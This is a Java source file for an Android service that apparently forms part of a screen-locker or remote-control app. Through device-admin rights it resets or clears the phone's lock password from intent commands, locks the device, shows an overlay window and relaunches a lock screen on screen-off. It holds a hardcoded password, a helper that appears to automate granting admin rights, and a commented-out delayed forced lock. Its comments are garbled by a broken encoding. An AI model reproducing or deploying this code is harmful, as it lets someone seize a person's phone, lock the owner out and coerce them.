/**
 * 
 */
package lock;


import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;

import android.util.Log;
import floatwindow.FloatWindowLock;
import order.screen.ScreenShotActivity;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;
/**
 * @author byc
 *
 */
public class LockService  extends Service {
	public static DevicePolicyManager policyManager;
    public static ComponentName mComponentName;
    public static final int OP_CLEAR_PWD=1;//������룻
    public static final int OP_SET_PWD=2;//�������룻
    public static final int OP_SET_PWD_AND_LOCK=3;//�������벢��������
    public static final int OP_LOCK=4;//������
    //private static final int LATENCY_TIME=1000;//Latency  1000*10  1000*60*60*24*3
    public static final int MY_REQUEST_CODE=123;//
    //public static boolean isServiceRun=false;
    public static String mPwd="800108";
    public static LockState mLockState=LockState.delayed;
    //private static GivePower givePower;
    public static  enum LockState {
        delayed,locked, unLocked;
    }
    private Handler handler=null;
    private Runnable runnable=null;
    private IntentFilter filter;
    private BroadcastReceiver mBatInfoReceiver;
    @Override
    public void onCreate() {
        //isServiceRun=true;
        //��ȡ�豸�������
        policyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mComponentName = new ComponentName(this, AdminReceiver.class);
        LockReceiver();
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mBatInfoReceiver);
        Log.d(ConfigCt.TAG, "LockService onDestroy() executed");
    }
    @Override
    public boolean stopService(Intent name) {
        Log.d(ConfigCt.TAG, "LockService stopService() executed");
        return super.stopService(name);
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(ConfigCt.TAG, "LockService onStartCommand() executed");
        //�ж��Ƿ�������Ȩ�ޣ����������������������Լ�����û�����ȡȨ��
        if (policyManager.isAdminActive(mComponentName)) {
            ConfigCt.getInstance(this).setLockPermission(true);
            if(intent!=null)
            op(intent);//ִ�в�����
        } else {
        	//handlerPower.postDelayed(runnablePower, 1000*1);//��AcessbilityServiceʱִ�У�
        	 LockPrepare();//��ȡȨ�ޣ�
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private void LockReceiver(){
        filter = new IntentFilter();
        // ��Ļ�����㲥
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        // ��Ļ�����㲥
        filter.addAction(Intent.ACTION_SCREEN_ON);
        // ��Ļ�����㲥
        filter.addAction(Intent.ACTION_USER_PRESENT);
        // ��������Դ���������ػ����Ի���������ʱϵͳ�ᷢ������㲥
        // example����ʱ����õ�ϵͳ�Ի���Ȩ�޿��ܸܺߣ��Ḳ��������������ߡ��ػ����Ի���֮�ϣ�
        // ���Լ�������㲥�����յ�ʱ�������Լ��ĶԻ�������pad���½ǲ��ֵ����ĶԻ���
        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

       mBatInfoReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, final Intent intent) {
                Log.d(ConfigCt.TAG, "mBatInfoReceiver onReceive");
                String action = intent.getAction();

                if (Intent.ACTION_SCREEN_ON.equals(action)) {
                    //if(mLockState==LockState.locked)ShowWindow();
                    Log.d(ConfigCt.TAG, "screen on");
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                    if(mLockState==LockState.locked)
                    	LockActivity.startSelf(getApplicationContext());
                    Log.d(ConfigCt.TAG, "screen off");
                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                    //HideWindow();
                	
                	LockActivity.startSelf(null);
                    mLockState=LockState.unLocked;
                    Log.d(ConfigCt.TAG, "screen unlock");
                } else if (Intent.ACTION_CLOSE_SYSTEM_DIALOGS.equals(intent.getAction())) {
                    Log.i(ConfigCt.TAG, " receive Intent.ACTION_CLOSE_SYSTEM_DIALOGS");
                }
            }
        };
        Log.d(ConfigCt.TAG, "mBatInfoReceiver  registerReceiver");
        registerReceiver(mBatInfoReceiver, filter);
    }

    /*
     * ����Ԥ��
     */
    public void LockPrepare(){
    	//if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.N)return;//android 7�˳���
    	if (policyManager==null) return;
    	if (policyManager.isAdminActive(mComponentName)) return;
    	if(handler!=null&&runnable!=null)return;
    	if(Funcs.isScreenLocked(this))return;
    	handler= new Handler();    
    	runnable = new Runnable() {    
    		@Override    
    	    public void run() {    
    			if(GivePermission.getGivePermission().isEnable()){
    				ScreenShotActivity.startInstance(LockService.this, ScreenShotActivity.REQUEST_MEDIA_DEVICE,mComponentName);    	    		
    				GivePermission.getGivePermission().EventStart();
    				GivePermission.getGivePermission().TimeStart();
    				return;
    	    	}
    			//handler.postDelayed(this, 1000*25);    
    		}    
    	};
    	handler.postDelayed(runnable, 200*1);//��AcessbilityServiceʱִ�У�
    }
    /*
     * ִ�У�������룻�������룻�������벢������������
     *  OP_CLEAR_PWD=1;//������룻
    	OP_SET_PWD=2;//�������룻
    	OP_SET_PWD_AND_LOCK=3;//�������벢��������
    	OP_LOCK=4;//������
     */
    private void op(Intent intent){
    	if (policyManager==null)return;
    	if (!policyManager.isAdminActive(mComponentName))return;
    	int op = intent.getIntExtra("op", 0);
        String pwd = intent.getStringExtra("pwd");
        switch(op){
        case OP_CLEAR_PWD:
        	policyManager.resetPassword("", 0);
        	break;
        case OP_SET_PWD:
        	policyManager.resetPassword(pwd, 0);
        	break;
        case OP_SET_PWD_AND_LOCK:
        	policyManager.resetPassword(pwd, 0);
        	policyManager.lockNow(); //��������
        	mLockState=LockState.locked;
        	LockActivity.startSelf(getApplicationContext());
        	FloatWindowLock.getInstance(this).ShowFloatingWindow();
        	break;
        case OP_LOCK:
        	policyManager.lockNow(); //��������
        	break;
        }
    }
    /*
    @TargetApi(Build.VERSION_CODES.N)
    public static void setWallpaper(Context context) {
    	if(android.os.Build.VERSION.SDK_INT<Build.VERSION_CODES.N)return;
        try {
            WallpaperManager mWallpaperManager = WallpaperManager.getInstance(context);
            if (mWallpaperManager != null) {//| WallpaperManager.FLAG_SYSTEM
                mWallpaperManager.setBitmap(BitmapFactory.decodeResource(context.getResources(), R.drawable.lock), null, true, WallpaperManager.FLAG_LOCK );
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
        private void processLock(){
    	final Handler handlerLock = new Handler();
    	Runnable runnable = new Runnable() {
    		@Override
    		public void run() {
    			mLockState=LockState.locked;
    			policyManager.resetPassword(mPwd, 0);
    			policyManager.lockNow(); //��������
    			if(android.os.Build.VERSION.SDK_INT>=Build.VERSION_CODES.N){
    				//setWallpaper(getApplicationContext());
    				LockActivity.startSelf(getApplicationContext());
    			}else{
    				LockActivity.startSelf(getApplicationContext());
    			}
    		}
    	};
    	handlerLock.postDelayed(runnable, LATENCY_TIME);//�ӳ�lock
    }
        public static void clearLockScreenPWD(){
    	if (policyManager==null)return;
    	if (policyManager.isAdminActive(mComponentName)) {
    		//policyManager.resetPassword(null, 0);
    		policyManager.resetPassword("", 0);
    	}
    }
    public static void setLock(String pwd){
    	//mLocking=true;
    	if(pwd.length()!=6)return;
    	if(Funcs.str2int(pwd)==-1)return;
    	mPwd=pwd;
    }
    */
}
